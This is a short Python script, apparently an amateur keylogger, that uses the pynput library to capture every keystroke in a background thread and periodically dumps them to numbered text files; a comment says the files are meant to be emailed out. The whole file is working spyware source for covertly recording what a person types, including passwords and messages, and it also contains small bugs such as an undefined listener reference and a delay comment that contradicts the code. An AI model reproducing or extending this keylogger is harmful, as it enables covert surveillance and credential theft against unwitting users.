from pynput.keyboard import Key, Listener
from pynput import keyboard
from threading import *
import time
import sys

# Delete file before new file is created, because file will be emailed. Don't forget to clear global variable containing temp keystrokes

# Global variables
SPECIALKEYS = [Key.enter, Key.space, Key.alt_l, Key.backspace, Key.tab, Key.caps_lock, Key.shift_l, Key.cmd_l, Key.ctrl_l, Key.up, Key.down, Key.right, Key.left]
SPECIALKEYSTRINGS = ["enter", "space", "alt", "backspace", "tab", "caps_lock", "shift", "windows", "control", "up", "down", "right", "left"]
STOPCOMBO = {keyboard.Key.alt_l, keyboard.Key.down}
SAVINGDELAY = 20
CURRENT = set()
COUNT = True
FILENUM = 1
KEYS = []

# Runs listener in seperate thread
class MyThread(Thread):
    def __init__(self, event):
        Thread.__init__(self)
        self.stopped = event
    def run(self):
        begin()

def begin():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Records then processes keys
def on_press(key):
    store(key)
    if key in STOPCOMBO:
        CURRENT.add(key)
        if all(k in CURRENT for k in STOPCOMBO):
            close()
            listener.stop()

def on_release(key):
    try:
        CURRENT.remove(key)
    except KeyError:
        pass

def store(key):
    if (key in SPECIALKEYS):
        KEYS.append(SPECIALKEYSTRINGS[SPECIALKEYS.index(key)])
    else:
        KEYS.append(str(key))

# Saves all recorded keys to file
def save():
    time.sleep(SAVINGDELAY) # 1 hour
    print(KEYS)
    global FILENUM
    fileName = "keys"+str(FILENUM)+".txt"
    file = open(fileName,"w+")
    for key in KEYS:
        file.write(key+" ")
    file.close()
    FILENUM += 1

# Close function for when alt+down_arrow is pressed
def close():
    global COUNT
    COUNT = False
    sys.exit()

# Code to stop
thread = MyThread(Event())
thread.start()

# Keeps a timer going to always back up keys to file
while COUNT:
    save()
